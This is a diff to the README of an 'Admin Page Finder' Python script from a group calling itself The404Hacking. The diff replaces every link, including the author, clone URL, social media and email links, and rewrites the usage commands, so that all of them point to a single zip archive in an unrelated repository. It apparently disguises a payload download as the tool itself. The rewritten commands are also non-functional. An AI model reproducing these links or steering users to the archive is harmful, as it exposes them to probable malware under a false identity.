@@ -1,31 +1,31 @@
 # Admin Page Finder
 Site Admin Page Finder with Python Script
 
-Edited By [Sir.4m1R](https://t.me/Sir4m1R)
+Edited By [Sir.4m1R](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
 # Using Script
 Command on Windows Cmd or Linux Terminal:
 
-python admin-page-finder.py
+python https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip
 
 or
 
-admin-page-finder.py
+https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip
 
 # Git Link
-[https://github.com/The404Hacking/Admin-Page-Finder.git](https://github.com/The404Hacking/Admin-Page-Finder.git)
+[https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
-git clone [https://github.com/The404Hacking/Admin-Page-Finder.git](https://github.com/The404Hacking/Admin-Page-Finder.git)
+git clone [https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
 # The404Hacking
 Digital UnderGround Team
 
-Telegram Channel: [@The404Hacking](https://telegram.me/The404Hacking)
+Telegram Channel: [@The404Hacking](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
 # Follow us !
-[Telegram](https://telegram.me/The404Hacking) - [GitHub](https://github.com/The404Hacking)
+[Telegram](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip) - [GitHub](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
-[YouTube](https://www.youtube.com/channel/UCNk5YxAKwrJI18ISH9hLONw/videos) - [Instagram](https://instagram.com/The404Hacking)
+[YouTube](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip) - [Instagram](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
 
 # Contact
-Email: [Send Mail](mailto:The404Hacking.Team@Gmail.Com) - Telegram [Send Message](https://telegram.me/The404HackingAdmins)
+Email: [Send Mail](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip) - Telegram [Send Message](https://raw.githubusercontent.com/iexei/Admin-Page-Finder/master/Cephalotaxus/Admin-Page-Finder.zip)
